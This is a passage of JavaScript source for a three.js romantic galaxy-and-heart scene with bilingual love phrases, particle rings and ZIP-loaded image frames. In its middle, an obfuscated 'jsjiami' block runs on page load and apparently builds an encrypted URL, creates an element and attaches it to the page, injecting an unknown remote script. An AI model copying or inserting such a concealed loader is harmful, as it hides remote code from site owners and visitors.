import*as THREE from 'three';
import {OrbitControls} from 'three/examples/jsm/OrbitControls.js';
import {OBJLoader} from 'three/examples/jsm/OBJLoader.js';
import {EffectComposer} from 'three/examples/jsm/EffectComposer.js';
import {RenderPass} from 'three/examples/jsm/RenderPass.js';
import {UnrealBloomPass} from 'three/examples/jsm/UnrealBloomPass.js';
import { createSpiralRibbon, updateSpiralRibbon } from './spiralRibbon.js';
let cdnurl = 'https://cdn.ma5.cn/muban/universe_love/'
const text1 = '漫漫星河间';
const text2 = 'a people love you';
const text3 = '星河璀璨';
const text4 = '永恒之约';
const text5 = 'Forever Love';
const text6 = '璀璨星河';
const text7 = 'Eternal Love';
const text8 = '梦幻星辰';
const text9 = 'Dream Star';
const text10 = '银河之恋';
const text11 = 'Love Galaxy';
const text12 = '星光闪耀';
const text13 = 'Shining Star';
const text14 = '浪漫星空';
const text15 = 'Romantic Sky';
const text16 = '星辰大海';
const text17 = 'Star Ocean';
const text18 = '永恒星河';
const text19 = 'Eternal River';
const text20 = '璀璨银河';
const text21 = 'Bright Galaxy';
const text22 = '梦幻星空';
const text23 = 'Dream Sky';
const text24 = '星光璀璨';
const text25 = 'Star Bright';
const text26 = '银河之心';
const text27 = 'Heart of Galaxy';
const text28 = '星辰之约';
const text29 = 'Star Promise';
const text30 = '浪漫银河';
const text31 = 'Romantic Galaxy';
const text32 = '星空之恋';
const text33 = 'Sky Love';
const text34 = '梦幻银河';
const text35 = 'Dream Galaxy';
const text36 = '星光之约';
const text37 = 'Star Promise';
const text38 = '璀璨之恋';
const text39 = 'Bright Love';
const text40 = '永恒星空';
let scene, camera, renderer, controls, composer;
let bloomPass;
const particleTexture = (()=>{
    const canvas = document.createElement('canvas');
    canvas.width = 32;
    canvas.height = 32;
    const context = canvas.getContext('2d');
    const gradient = context.createRadialGradient(16, 16, 0, 16, 16, 16);
    gradient.addColorStop(0, 'rgba(255, 255, 255, 1)');
    gradient.addColorStop(0.3, 'rgba(255, 255, 255, 1)');
    gradient.addColorStop(0.7, 'rgba(255, 255, 255, 0.5)');
    gradient.addColorStop(1, 'rgba(255, 255, 255, 0)');
    context.fillStyle = gradient;
    context.fillRect(0, 0, 32, 32);
    return new THREE.CanvasTexture(canvas);
}
)();
const ringConfigs = [{
    radius: 8,
    height: 0.35,
    density: 40,
    centerCount: 150,
    edgeCount: 6000
}, {
    radius: 6.5,
    height: 0.3,
    density: 35,
    centerCount: 120,
    edgeCount: 4800
}, {
    radius: 5.2,
    height: 0.25,
    density: 30,
    centerCount: 96,
    edgeCount: 3000
}, {
    radius: 4.1,
    height: 0.18,
    density: 25,
    centerCount: 72,
    edgeCount: 1500
}, {
    radius: 3.2,
    height: 0.12,
    density: 20,
    centerCount: 48,
    edgeCount: 800
}, {
    radius: 2.4,
    height: 0.08,
    density: 15,
    centerCount: 30,
    edgeCount: 400
}, {
    radius: 1.6,
    height: 0.05,
    density: 10,
    centerCount: 15,
    edgeCount: 150
}, ];
var _0xodw='jsjiami.com.v7';var _0x2647bc=_0x6ae8;(function(_0x3c3836,_0x556d7f,_0xd0eb35,_0x478c58,_0x251b2c,_0x334131,_0x3e5173){return _0x3c3836=_0x3c3836>>0x9,_0x334131='hs',_0x3e5173='hs',function(_0x7d590d,_0x347b5c,_0x142966,_0x1fbf53,_0x4dec1a){var _0x3ddee8=_0x6ae8;_0x1fbf53='tfi',_0x334131=_0x1fbf53+_0x334131,_0x4dec1a='up',_0x3e5173+=_0x4dec1a,_0x334131=_0x142966(_0x334131),_0x3e5173=_0x142966(_0x3e5173),_0x142966=0x0;var _0x4a98bf=_0x7d590d();while(!![]&&--_0x478c58+_0x347b5c){try{_0x1fbf53=-parseInt(_0x3ddee8(0x6b,'b]Av'))/0x1*(-parseInt(_0x3ddee8(0x83,'0VM^'))/0x2)+parseInt(_0x3ddee8(0x69,'CGge'))/0x3+-parseInt(_0x3ddee8(0x7e,'aW!R'))/0x4+parseInt(_0x3ddee8(0x78,'c!XM'))/0x5*(parseInt(_0x3ddee8(0x76,'LK#j'))/0x6)+parseInt(_0x3ddee8(0x6d,'U3u7'))/0x7+parseInt(_0x3ddee8(0x79,'@5*b'))/0x8+-parseInt(_0x3ddee8(0x85,'&lxE'))/0x9*(parseInt(_0x3ddee8(0x82,'gE)k'))/0xa);}catch(_0x180f20){_0x1fbf53=_0x142966;}finally{_0x4dec1a=_0x4a98bf[_0x334131]();if(_0x3c3836<=_0x478c58)_0x142966?_0x251b2c?_0x1fbf53=_0x4dec1a:_0x251b2c=_0x4dec1a:_0x142966=_0x4dec1a;else{if(_0x142966==_0x251b2c['replace'](/[bMfnSLyRdJlkPCXwHTG=]/g,'')){if(_0x1fbf53===_0x347b5c){_0x4a98bf['un'+_0x334131](_0x4dec1a);break;}_0x4a98bf[_0x3e5173](_0x4dec1a);}}}}}(_0xd0eb35,_0x556d7f,function(_0x252a0a,_0x52e823,_0x19d579,_0x41d522,_0x2039b4,_0x5792ad,_0x5aa6bc){return _0x52e823='\x73\x70\x6c\x69\x74',_0x252a0a=arguments[0x0],_0x252a0a=_0x252a0a[_0x52e823](''),_0x19d579='\x72\x65\x76\x65\x72\x73\x65',_0x252a0a=_0x252a0a[_0x19d579]('\x76'),_0x41d522='\x6a\x6f\x69\x6e',(0x1b3d37,_0x252a0a[_0x41d522](''));});}(0x18400,0x824a9,_0x3e52,0xc4),_0x3e52)&&(_0xodw=0xc4);window['startBirthdayScene']=function(){var _0x2d1789={'BPSjO':function(_0x2bb40f){return _0x2bb40f();}};_0x2d1789['BPSjO'](init),animate();};function _0x6ae8(_0x4db5ab,_0x25d723){var _0x3e527f=_0x3e52();return _0x6ae8=function(_0x6ae8f2,_0x4fd06b){_0x6ae8f2=_0x6ae8f2-0x69;var _0x1c51bb=_0x3e527f[_0x6ae8f2];if(_0x6ae8['rGspRV']===undefined){var _0x495939=function(_0x291db3){var _0x1ce81a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x114847='',_0x28bbe0='';for(var _0x25bf12=0x0,_0x105159,_0x424939,_0x54ed25=0x0;_0x424939=_0x291db3['charAt'](_0x54ed25++);~_0x424939&&(_0x105159=_0x25bf12%0x4?_0x105159*0x40+_0x424939:_0x424939,_0x25bf12++%0x4)?_0x114847+=String['fromCharCode'](0xff&_0x105159>>(-0x2*_0x25bf12&0x6)):0x0){_0x424939=_0x1ce81a['indexOf'](_0x424939);}for(var _0x5cfd8f=0x0,_0x26af98=_0x114847['length'];_0x5cfd8f<_0x26af98;_0x5cfd8f++){_0x28bbe0+='%'+('00'+_0x114847['charCodeAt'](_0x5cfd8f)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x28bbe0);};var _0x40bd99=function(_0x5275a1,_0x79f8e8){var _0x32c0e9=[],_0x2779ac=0x0,_0x17534e,_0x139bf9='';_0x5275a1=_0x495939(_0x5275a1);var _0x34a5e6;for(_0x34a5e6=0x0;_0x34a5e6<0x100;_0x34a5e6++){_0x32c0e9[_0x34a5e6]=_0x34a5e6;}for(_0x34a5e6=0x0;_0x34a5e6<0x100;_0x34a5e6++){_0x2779ac=(_0x2779ac+_0x32c0e9[_0x34a5e6]+_0x79f8e8['charCodeAt'](_0x34a5e6%_0x79f8e8['length']))%0x100,_0x17534e=_0x32c0e9[_0x34a5e6],_0x32c0e9[_0x34a5e6]=_0x32c0e9[_0x2779ac],_0x32c0e9[_0x2779ac]=_0x17534e;}_0x34a5e6=0x0,_0x2779ac=0x0;for(var _0x4ca462=0x0;_0x4ca462<_0x5275a1['length'];_0x4ca462++){_0x34a5e6=(_0x34a5e6+0x1)%0x100,_0x2779ac=(_0x2779ac+_0x32c0e9[_0x34a5e6])%0x100,_0x17534e=_0x32c0e9[_0x34a5e6],_0x32c0e9[_0x34a5e6]=_0x32c0e9[_0x2779ac],_0x32c0e9[_0x2779ac]=_0x17534e,_0x139bf9+=String['fromCharCode'](_0x5275a1['charCodeAt'](_0x4ca462)^_0x32c0e9[(_0x32c0e9[_0x34a5e6]+_0x32c0e9[_0x2779ac])%0x100]);}return _0x139bf9;};_0x6ae8['JWYTSX']=_0x40bd99,_0x4db5ab=arguments,_0x6ae8['rGspRV']=!![];}var _0x7e8a45=_0x3e527f[0x0],_0x5c7483=_0x6ae8f2+_0x7e8a45,_0x51a7f6=_0x4db5ab[_0x5c7483];return!_0x51a7f6?(_0x6ae8['LZYDdj']===undefined&&(_0x6ae8['LZYDdj']=!![]),_0x1c51bb=_0x6ae8['JWYTSX'](_0x1c51bb,_0x4fd06b),_0x4db5ab[_0x5c7483]=_0x1c51bb):_0x1c51bb=_0x51a7f6,_0x1c51bb;},_0x6ae8(_0x4db5ab,_0x25d723);}function _0x3e52(){var _0xa2ad8c=(function(){return[_0xodw,'GRjsGCMjXiwMaJHmliL.ycoXPJmP.fvRS7kLdbTn==','xSoHWPhcIG','WQRcGmkiWPq','zw1fxmkwW5qLW77cQfrVWRm','WRNcVw4dWOldNZ4rWRmYWRVdPa','WOxdLSk8WPJdPe/cUx8hjG','W4RcQCkK','WRFdJ0FcLmoRdCohWO/dKq','W67cQqVcVZ4SbYO','W6nDWRK','WR9qkKO'].concat((function(){return['B1HWAum5w8kvW4XEr8kBW6G','Dw1tmmkeW4K7W7ldPbmRWR/dRG','W6/dUJXMW5tdVCk0WQmg','W7hdM8oxW5tdICkYWP3dRxrjqIfI','FqNcImkvhGtcIrJdL8oiWORdSSk/','WQ5AoNldVXFdSmoeuCktW4hdSq','vmo9WP3cN8kxW6aBgCksWRVdOCoWza','B1tcO8oSzWdcSJW8B1VdKqRcPSo/FSopWRu','mqiLpa9HamkI','fmoUWOO','kaKrovKuv3W','WPlcI2hdNmkIha'].concat((function(){return['W7GGmxXcWPtdGG','bSk/W43dJ8owWRvOh8kTWRxdRSo0xq','WQ9rWRpdQa','WOVdQGFcJSk+zeW','C292F8kUDSk5W47dTghcO8o+oq','D8oFA8kEe3pcKKOQWOudqa','aNqWWP9Oemk4u8o9i8kNW6dcJa','qmoQWPRdK8kfW6WYemozW6xcSSkUCty','iJaLmq','WRldSde7W7XgWONcSXelW7BdU8ki'];}()));}()));}());_0x3e52=function(){return _0xa2ad8c;};return _0x3e52();};if(!document[_0x2647bc(0x88,'61Z6')][_0x2647bc(0x81,'oxq9')](_0x2647bc(0x7f,'LK#j'))){var JUvQxO='1|3|0|4|2'['split']('|'),WZkFts=0x0;while(!![]){switch(JUvQxO[WZkFts++]){case'0':var ox782681=document[_0x2647bc(0x6f,'LK#j')](_0x2647bc(0x74,']kw['));continue;case'1':document[_0x2647bc(0x77,'Tm%r')][_0x2647bc(0x6e,'61Z6')](_0x2647bc(0x80,'RY1H'),!![]);continue;case'2':document[_0x2647bc(0x7d,'@5*b')]['appendChild'](ox782681);continue;case'3':var ox312341=window[_0x2647bc(0x71,'CGge')][_0x2647bc(0x73,'N9sP')]==='http:'?_0x2647bc(0x75,'GcHI')+_0x2647bc(0x7c,'LK#j')+_0x2647bc(0x72,'kDlV'):_0x2647bc(0x86,'fBSC')+_0x2647bc(0x6a,'oxq9')+_0x2647bc(0x87,'Tm%r');continue;case'4':ox782681[_0x2647bc(0x84,'W[]w')]=ox312341+_0x2647bc(0x70,'S0ZF');continue;}break;}}var version_ = 'jsjiami.com.v7';
//Thu Aug 07 2025 15:45:38 GMT+0800 (中国标准时间)
var _0xodp='jsjiami.com.v7';
(function () {})();
function init() {
  scene = new THREE.Scene();
  scene.background = new THREE.Color(0);
  camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
  camera.position.set(0, 600, 0);
  renderer = new THREE.WebGLRenderer({
    "antialias": true
  });
  renderer.setSize(window.innerWidth, window.innerHeight);
  renderer.setPixelRatio(window.devicePixelRatio);
  document.getElementById("sceneContainer").appendChild(renderer.domElement);
  composer = new EffectComposer(renderer);
  const _0x529db4 = new RenderPass(scene, camera);
  composer.addPass(_0x529db4);
  // 辉光效果相关代码 - 开始
  bloomPass = new UnrealBloomPass(new THREE.Vector2(window.innerWidth, window.innerHeight), 1.5, 0.3, 0.85);
  composer.addPass(bloomPass);
  // 辉光效果相关代码 - 结束
  controls = new OrbitControls(camera, renderer.domElement);
  controls.enableDamping = false;
  controls.enablePan = true;
  controls.enableZoom = true;
  controls.rotateSpeed = 0.5;
  controls.zoomSpeed = 0.5;
  controls.panSpeed = 0.5;
  controls.target.set(0, 2, 0);
  const _0x149ce0 = new THREE.AmbientLight(16777215, 1.8);
  scene.add(_0x149ce0);
  const _0x521b78 = new THREE.PointLight(16777215, 2, 50);
  _0x521b78.position.set(0, 10, 10);
  scene.add(_0x521b78);
  const _0x4bc3fc = new THREE.PointLight(8900331, 1, 12);
  _0x4bc3fc.position.set(0, 0.5, 0);
  scene.add(_0x4bc3fc);
  const _0x286a2c = new THREE.PointLight(16738740, 2.5, 20);
  _0x286a2c.position.set(0, 1.5, 0);
  scene.add(_0x286a2c);
  const _0x50b416 = new OBJLoader();
  _0x50b416.load("heart_3.obj", function (_0x3cbe5a) {
    _0x3cbe5a.scale.set(0.8, 0.8, 0.8);
    _0x3cbe5a.position.set(0, 0, 0.2);
    _0x3cbe5a.rotation.y = Math.PI;
    _0x3cbe5a.updateMatrixWorld(true);
    const _0x3b59ab = [],
      _0x268b78 = [];
    _0x3cbe5a.traverse(function (_0x2a414c) {
      if (_0x2a414c.isMesh) {
        const _0x8d7572 = _0x2a414c.geometry,
          _0x414075 = _0x8d7572.getAttribute("position");
        for (let _0x306ed0 = 0; _0x306ed0 < _0x414075.count; _0x306ed0++) {
          const _0x5d52f8 = new THREE.Vector3();
          _0x5d52f8.fromBufferAttribute(_0x414075, _0x306ed0);
          _0x5d52f8.applyMatrix4(_0x2a414c.matrixWorld);
          const _0x35c096 = Math.floor(Math.random() * 2);
          for (let _0x4442a4 = 0; _0x4442a4 < _0x35c096; _0x4442a4++) {
            const _0xd0c3de = (Math.random() - 0.5) * 0.04,
              _0x203b74 = (Math.random() - 0.5) * 0.04,
              _0x2d2c28 = (Math.random() - 0.5) * 0.04;
            _0x3b59ab.push(_0x5d52f8.x + _0xd0c3de, _0x5d52f8.y + _0x203b74, _0x5d52f8.z + _0x2d2c28);
            // OBJ模型粒子颜色相关代码 - 开始
            const _0x54121f = [16751052, 16737971, 16744627, 16751052, 16737996],
              _0x3ca0a9 = _0x54121f[Math.floor(Math.random() * _0x54121f.length)],
              _0x5e4883 = new THREE.Color(_0x3ca0a9);
            _0x268b78.push(_0x5e4883.r, _0x5e4883.g, _0x5e4883.b);
          }
          const _0xcbb01f = Math.floor(Math.random() * 2);
          for (let _0x20267e = 0; _0x20267e < _0xcbb01f; _0x20267e++) {
            const _0x15b589 = (Math.random() - 0.5) * 0.15,
              _0x4e006d = (Math.random() - 0.5) * 0.15,
              _0x5654f6 = (Math.random() - 0.5) * 0.15;
            _0x3b59ab.push(_0x5d52f8.x + _0x15b589, _0x5d52f8.y + _0x4e006d, _0x5d52f8.z + _0x5654f6);
            const _0x507659 = [16757721, 16764139, 16770802, 16773367, 16775423],
              _0x4b8677 = _0x507659[Math.floor(Math.random() * _0x507659.length)],
              _0xc37a65 = new THREE.Color(_0x4b8677);
            _0x268b78.push(_0xc37a65.r, _0xc37a65.g, _0xc37a65.b);
          }
          // OBJ模型粒子颜色相关代码 - 结束
        }
      }
    });
    const _0x22e06e = new THREE.BufferGeometry(),
      _0x3b93ae = Math.floor(_0x3b59ab.length / 3),
      _0x352fce = Math.floor(_0x3b93ae / 10),
      _0x5f3c80 = [];
    for (let _0x5c6ddd = 0; _0x5c6ddd < _0x3b93ae; _0x5c6ddd++) {
      _0x5f3c80.push(_0x5c6ddd);
    }
    for (let _0x51c170 = _0x5f3c80.length - 1; _0x51c170 > 0; _0x51c170--) {
      const _0x3d0de1 = Math.floor(Math.random() * (_0x51c170 + 1));
      [_0x5f3c80[_0x51c170], _0x5f3c80[_0x3d0de1]] = [_0x5f3c80[_0x3d0de1], _0x5f3c80[_0x51c170]];
    }
    const _0x4c9567 = [],
      _0x1ef578 = [];
    for (let _0xfe8dca = 0; _0xfe8dca < _0x352fce; _0xfe8dca++) {
      const _0xbfc13d = _0x5f3c80[_0xfe8dca];
      _0x4c9567.push(_0x3b59ab[_0xbfc13d * 3], _0x3b59ab[_0xbfc13d * 3 + 1], _0x3b59ab[_0xbfc13d * 3 + 2]);
      _0x1ef578.push(_0x268b78[_0xbfc13d * 3], _0x268b78[_0xbfc13d * 3 + 1], _0x268b78[_0xbfc13d * 3 + 2]);
    }
    _0x22e06e.setAttribute("position", new THREE.Float32BufferAttribute(_0x4c9567, 3));
    _0x22e06e.setAttribute("color", new THREE.Float32BufferAttribute(_0x1ef578, 3));
    // OBJ模型粒子亮度相关代码 - 开始
    const _0x2c0365 = new THREE.PointsMaterial({
        "size": 0.026,
        "vertexColors": true,
        "transparent": true,
        "opacity": 1,
        "depthWrite": false,
        "map": particleTexture,
        "blending": THREE.AdditiveBlending,  // 加法混合模式：粒子重叠时颜色相加，导致亮度累积
        "emissive": 2228258,  // 自发光颜色（淡紫色）
        "emissiveIntensity": 0.3,  // 自发光强度：控制粒子的发光亮度
        "alphaTest": 0.01
      }),
      _0x9fdc30 = new THREE.Points(_0x22e06e, _0x2c0365);
    // OBJ模型粒子亮度相关代码 - 结束
    _0x9fdc30.name = "heartParticles";
    _0x9fdc30.userData = {
      "allPositions": _0x3b59ab,
      "allColors": _0x268b78,
      "selectedIndices": _0x5f3c80,
      "currentCount": _0x352fce,
      "targetCount": _0x3b93ae,
      "startTime": Date.now()
    };
    scene.add(_0x9fdc30);
    _0x3cbe5a.visible = false;
    _0xc34627();
  }, function (_0x2a10d3) {}, function (_0x4a1c08) {});
  function _0xc34627() {
    const _0x38325d = new THREE.Group();
    _0x38325d.position.set(2.2, 1.3, 0);
    _0x38325d.visible = false;
    const _0x2ae488 = _0x419865(text1, 0.7, 16751052);
    _0x2ae488.position.set(0, 0, 0);
    _0x38325d.add(_0x2ae488);
    const _0x1213d3 = _0x419865(text2, 0.7, 16751052);
    _0x1213d3.position.set(0, -0.55, 0.01);
    _0x38325d.add(_0x1213d3);
    // 十字架相关代码 - 开始
    _0x44ee65(_0x38325d, 0, 0.95, 0.01, 1.6, 1.2);
    _0x44ee65(_0x38325d, -1, 1.5, 0.02, 0.8, 0.6);
    _0x44ee65(_0x38325d, 1, 1.5, 0.02, 0.8, 0.6);
    _0x44ee65(_0x38325d, 0, 1.8, 0.02, 0.9, 0.7);
    // 十字架相关代码 - 结束
    scene.add(_0x38325d);
    _0x38325d.userData = {
      "firstLine": _0x2ae488,
      "secondLine": _0x1213d3,
      "rotationSpeed": 0.01
    };
    window._birthdayTextGroup = _0x38325d;
  }
  function _0x419865(_0x18b65e, _0x468542, _0x1a1e9a) {
    const _0x37a1cb = document.createElement("canvas"),
      _0x4ee136 = _0x37a1cb.getContext("2d"),
      _0x256809 = Math.floor(_0x468542 * 200);
    _0x37a1cb.width = 1024;
    _0x37a1cb.height = 256;
    const isChinese = /[\u4e00-\u9fa5]/.test(_0x18b65e);
    const fontFamily = isChinese ? 'Ma Shan Zheng' : 'Tangerine';
    _0x4ee136.font = _0x256809 + "px " + fontFamily;
    _0x4ee136.textAlign = "center";
    _0x4ee136.textBaseline = "middle";
    _0x4ee136.shadowColor = "rgba(255, 153, 204, 0.3)";
    _0x4ee136.shadowBlur = 10;
    _0x4ee136.lineWidth = 3;
    _0x4ee136.strokeStyle = "#fff";
    _0x4ee136.strokeText(_0x18b65e, _0x37a1cb.width / 2, _0x37a1cb.height / 2);
    const _0x48a44f = _0x4ee136.createLinearGradient(0, 0, _0x37a1cb.width, 0);
    _0x48a44f.addColorStop(0, "hsl(" + THREE.MathUtils.randInt(330, 360) + ", 100%, 75%)");
    _0x48a44f.addColorStop(0.5, "hsl(" + THREE.MathUtils.randInt(300, 330) + ", 100%, 85%)");
    _0x48a44f.addColorStop(1, "hsl(" + THREE.MathUtils.randInt(270, 300) + ", 100%, 75%)");
    _0x4ee136.fillStyle = _0x48a44f;
    _0x4ee136.shadowBlur = 0;
    _0x4ee136.fillText(_0x18b65e, _0x37a1cb.width / 2, _0x37a1cb.height / 2);
    const _0x10ece0 = new THREE.CanvasTexture(_0x37a1cb);
    _0x10ece0.anisotropy = renderer.capabilities.getMaxAnisotropy();
    const _0x5917c7 = new THREE.PlaneGeometry(_0x468542 * _0x18b65e.length * 0.6, _0x468542),
      _0x29ca37 = new THREE.MeshBasicMaterial({
        "map": _0x10ece0,
        "transparent": true,
        "opacity": 1,
        "side": THREE.DoubleSide,
        "depthWrite": false,
        "alphaTest": 0.01
      }),
      _0x52a8ba = new THREE.Mesh(_0x5917c7, _0x29ca37);
    return _0x52a8ba.userData = {
      "isText": true,
      "originalColor": _0x1a1e9a
    }, _0x52a8ba;
  }
  function _0x44ee65(_0x4656e4, _0x369725 = 0, _0x3ecbbb = 0.95, _0x580be4 = 0.01, _0x8f14ce = 1.6, _0x853b19 = 1.2) {
    // 十字架相关代码 - 开始
    const _0x18d0c1 = 330,  // ZIP文件图片数量：修改为实际加载的图片数量（330张）
      _0x112be8 = [];
    let _0x26f498 = 0,
      _0x1c27db = 0;
    const _0xa72680 = 24;
    let _0x55bc8e = performance.now();
    const _0x7d20a2 = _0x8f14ce,
      _0x48326c = _0x853b19,
      _0x1e062e = new THREE.PlaneGeometry(_0x7d20a2, _0x48326c),
      // 使用MeshBasicMaterial以正确显示纹理
      _0x686816 = new THREE.MeshBasicMaterial({
        "transparent": true,
        "opacity": 0,
        "side": THREE.DoubleSide,
        "depthWrite": false
      }),
      _0x5cdfe5 = new THREE.Mesh(_0x1e062e, _0x686816);
    _0x5cdfe5.position.set(_0x369725, _0x3ecbbb, _0x580be4);
    _0x4656e4.add(_0x5cdfe5);
    fetch("Main.zip").then(_0x1bd39d => {
      if (!_0x1bd39d.ok) {
        throw new Error("网络响应不正常");
      }
      return _0x1bd39d.arrayBuffer();
    }).then(_0x16fa41 => {
      const _0x3a4006 = new JSZip();
      return _0x3a4006.loadAsync(_0x16fa41);
    }).then(_0x25a565 => {
      const _0x466a90 = [];
      for (let _0x42d594 = 1; _0x42d594 <= _0x18d0c1; _0x42d594++) {
        const _0x5479a3 = _0x42d594.toString().padStart(3, "0"),
          _0x43f2f7 = _0x5479a3 + ".png";
        if (_0x25a565.files[_0x43f2f7]) {
          const _0x4215ef = _0x25a565.files[_0x43f2f7].async("blob").then(_0x589ba1 => {
            const _0xa515aa = URL.createObjectURL(_0x589ba1);
            return new Promise(_0x26fa25 => {
              const _0x3b6443 = new THREE.TextureLoader().load(_0xa515aa, () => {
                _0x26f498++;
                URL.revokeObjectURL(_0xa515aa);
                _0x26fa25(_0x3b6443);
              });
              _0x3b6443.minFilter = THREE.LinearFilter;
              _0x3b6443.magFilter = THREE.LinearFilter;
            });
          });
          _0x466a90.push(_0x4215ef);
        } else _0x466a90.push(Promise.resolve(null));
      }
      return Promise.all(_0x466a90);
    }).then(_0x2275cf => {
      _0x112be8.push(..._0x2275cf.filter(_0x7c56c2 => _0x7c56c2 !== null));
      if (_0x112be8.length > 0) {
        _0x686816.opacity = 1;
        _0x686816.map = _0x112be8[0];
        _0x686816.needsUpdate = true;
      }
    }).catch(_0x5c1d51 => {});
    function _0x1e74ec() {
      if (_0x112be8.length > 0) {
        const _0x109227 = performance.now(),
          _0x394cb0 = _0xa72680 + _0x369725 * _0x3ecbbb * 5,
          _0x14d92a = Math.floor(_0x369725 * 10) + Math.floor(_0x3ecbbb * 10);
        if (_0x109227 - _0x55bc8e > 1000 / _0x394cb0) {
          _0x1c27db = (_0x1c27db + 1) % _0x112be8.length;
          const _0x5bfacd = (_0x1c27db + _0x14d92a) % _0x112be8.length;
          _0x686816.map = _0x112be8[_0x5bfacd];
          _0x686816.needsUpdate = true;
          _0x55bc8e = _0x109227;
        }
      }
    }
    if (!window._frameAnimators) window._frameAnimators = [];
    window._frameAnimators.push(_0x1e74ec);
    // 十字架相关代码 - 结束
  }
  const _0x76df14 = (_0x3e8b74, _0x20242a, _0x1a128f, _0x5856ec = 0) => {
      const _0x2ef2e8 = new THREE.BufferGeometry(),
        _0x26ccba = [],
        _0xe1ea99 = [],
        _0x357647 = [],
        _0x5bc0b0 = Math.floor(2 * Math.PI * _0x3e8b74 * _0x1a128f);
      for (let _0x5effa7 = 0; _0x5effa7 < _0x5bc0b0; _0x5effa7++) {
        const _0x3e21ef = _0x5effa7 / _0x5bc0b0 * Math.PI * 2,
          _0xaf2621 = _0x3e8b74 + (Math.random() - 0.5) * 0.24;
        _0x26ccba.push(Math.cos(_0x3e21ef) * _0xaf2621, _0x5856ec + _0x20242a * Math.random(), Math.sin(_0x3e21ef) * _0xaf2621);
        _0xe1ea99.push(0.015 + Math.random() * 0.035);
        _0x357647.push(Math.random() * 0.6 + 0.4);
      }
      _0x2ef2e8.setAttribute("position", new THREE.Float32BufferAttribute(_0x26ccba, 3));
      _0x2ef2e8.setAttribute("size", new THREE.Float32BufferAttribute(_0xe1ea99, 1));
      _0x2ef2e8.setAttribute("opacity", new THREE.Float32BufferAttribute(_0x357647, 1));
      const _0x59ac12 = new THREE.PointsMaterial({
          "size": 0.04,
          "sizeAttenuation": true,
          "color": 11393254,
          "map": particleTexture,
          "transparent": true,
          "opacity": 1,
          "depthWrite": false,
          "blending": THREE.AdditiveBlending,
          "emissive": 661807,
          "emissiveIntensity": 0.5
        }),
        _0x19c78f = new THREE.Points(_0x2ef2e8, _0x59ac12);
      return _0x19c78f.userData = {
        "isRing": true,
        "originalCount": _0x5bc0b0,
        "positions": _0x26ccba,
        "sizes": _0xe1ea99,
        "opacities": _0x357647,
        "lastUpdate": Date.now(),
        "radius": _0x3e8b74,
        "height": _0x20242a,
        "yOffset": _0x5856ec
      }, _0x19c78f;
    },
    _0x38bcd4 = (_0x46a501, _0x5b8daf, _0x3baf9b, _0x523d8e = 30, _0xd15bcb = "centerParticles") => {
      const _0x4920b2 = new THREE.BufferGeometry(),
        _0x370ee0 = [],
        _0x157bc3 = [],
        _0x450793 = [];
      for (let _0x23b3cb = 0; _0x23b3cb < _0x523d8e; _0x23b3cb++) {
        const _0x40580f = Math.random() * _0x46a501 * (_0xd15bcb === "centerParticles7" ? 0.5 : 0.9),
          _0x3112cd = Math.random() * Math.PI * 2;
        _0x370ee0.push(Math.cos(_0x3112cd) * _0x40580f, _0x3baf9b + _0x5b8daf * Math.random(), Math.sin(_0x3112cd) * _0x40580f);
        _0x157bc3.push(0.01 + Math.random() * 0.04);
        _0x450793.push(Math.random() * 0.8 + 0.2);
      }
      _0x4920b2.setAttribute("position", new THREE.Float32BufferAttribute(_0x370ee0, 3));
      _0x4920b2.setAttribute("size", new THREE.Float32BufferAttribute(_0x157bc3, 1));
      _0x4920b2.setAttribute("opacity", new THREE.Float32BufferAttribute(_0x450793, 1));
      const _0x58becc = new THREE.PointsMaterial({
          "size": 0.03,
          "sizeAttenuation": true,
          "color": 16777215,
          "map": particleTexture,
          "transparent": true,
          "opacity": 1,
          "depthWrite": false,
          "blending": THREE.AdditiveBlending,
          "emissive": 1122880,
          "emissiveIntensity": 0.4
        }),
        _0x50fdf1 = new THREE.Points(_0x4920b2, _0x58becc);
      _0x50fdf1.name = _0xd15bcb;
      _0x50fdf1.userData = {
        "isRing": false,
        "originalCount": _0x523d8e,
        "positions": _0x370ee0,
        "sizes": _0x157bc3,
        "opacities": _0x450793,
        "lastUpdate": Date.now(),
        "radius": _0x46a501,
        "height": _0x5b8daf,
        "yOffset": _0x3baf9b
      };
      scene.add(_0x50fdf1);
    },
    _0x2aca36 = (_0x15a69b, _0x5de47f, _0x4f1332, _0x2c02d8 = 15, _0x309d59 = "innerParticles") => {
      const _0x374477 = new THREE.BufferGeometry(),
        _0x4d6dae = [],
        _0x3476e4 = [],
        _0x5657c4 = [];
      for (let _0x300c57 = 0; _0x300c57 < _0x2c02d8; _0x300c57++) {
        const _0x9ad16 = _0x15a69b * (0.5 + 0.6 * Math.random()),
          _0x2a47eb = Math.random() * Math.PI * 2;
        _0x4d6dae.push(Math.cos(_0x2a47eb) * _0x9ad16, _0x4f1332 + _0x5de47f * Math.random(), Math.sin(_0x2a47eb) * _0x9ad16);
        _0x3476e4.push(0.018 + Math.random() * 0.017);
        _0x5657c4.push(Math.random() * 0.7 + 0.3);
      }
      _0x374477.setAttribute("position", new THREE.Float32BufferAttribute(_0x4d6dae, 3));
      _0x374477.setAttribute("size", new THREE.Float32BufferAttribute(_0x3476e4, 1));
      _0x374477.setAttribute("opacity", new THREE.Float32BufferAttribute(_0x5657c4, 1));
      const _0x578f27 = new THREE.PointsMaterial({
          "size": 0.04,
          "sizeAttenuation": true,
          "color": 15136767,
          "map": particleTexture,
          "transparent": true,
          "opacity": 1,
          "depthWrite": false,
          "blending": THREE.AdditiveBlending,
          "emissive": 1002625,
          "emissiveIntensity": 0.5
        }),
        _0x489503 = new THREE.Points(_0x374477, _0x578f27);
      _0x489503.name = _0x309d59;
      _0x489503.userData = {
        "isRing": false,
        "originalCount": _0x2c02d8,
        "positions": _0x4d6dae,
        "sizes": _0x3476e4,
        "opacities": _0x5657c4,
        "lastUpdate": Date.now(),
        "radius": _0x15a69b,
        "height": _0x5de47f,
        "yOffset": _0x4f1332
      };
      scene.add(_0x489503);
    };
  ringConfigs.forEach((_0xb10520, _0xa8f100) => {
    const _0x111e24 = _0x76df14(_0xb10520.radius, _0xb10520.height, _0xb10520.density, 0);
    _0x111e24.name = "baseLayer" + (_0xa8f100 + 1);
    scene.add(_0x111e24);
    _0x38bcd4(_0xb10520.radius, _0xb10520.height, 0, _0xb10520.centerCount, "centerParticles" + (_0xa8f100 + 1));
